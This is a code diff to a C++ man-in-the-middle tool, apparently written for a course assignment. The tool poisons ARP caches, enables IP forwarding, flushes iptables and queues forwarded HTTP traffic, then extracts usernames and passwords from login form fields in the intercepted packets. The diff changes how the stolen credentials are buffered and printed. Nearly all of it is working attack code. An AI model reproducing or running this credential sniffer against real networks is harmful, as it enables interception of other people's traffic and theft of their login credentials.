@@ -313,6 +313,9 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 }
 
+
+string username = "";
+string password = "";
 static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
     char *packet;
@@ -341,9 +344,9 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
             string payload = packet + ip_header->ihl * 4 + tcp_header->doff * 4;
             if (payload.find("txtUsername") != string::npos)
             {
-                cout << "Username: " << payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12) << endl;
+                username = payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12);
                 // after & is password txtPassword=
-                cout << "Password: " << payload.substr(payload.find("txtPassword") + 12, payload.find("\n", payload.find("txtPassword")) - payload.find("txtPassword") - 12) << endl;
+                password = payload.substr(payload.find("txtPassword") + 12, payload.find("\n", payload.find("txtPassword")) - payload.find("txtPassword") - 12);
             }
         }
     }
@@ -399,6 +402,13 @@ void analyze_packet(){
     while ((rv = recv(fd, buf, sizeof(buf), 0)))
     {
         nfq_handle_packet(h, buf, rv);
+        if (username != "" && password != "")
+        {
+            cout << "Username: " << username << endl;
+            cout << "Password: " << password << endl;
+            username = "";
+            password = "";
+        }
     }
     nfq_destroy_queue(qh);
     nfq_close(h);
@@ -442,7 +452,6 @@ int main()
     system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
     system("iptables -F");
     system("iptables -t nat -F");
-
     system("iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0");
     
     // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
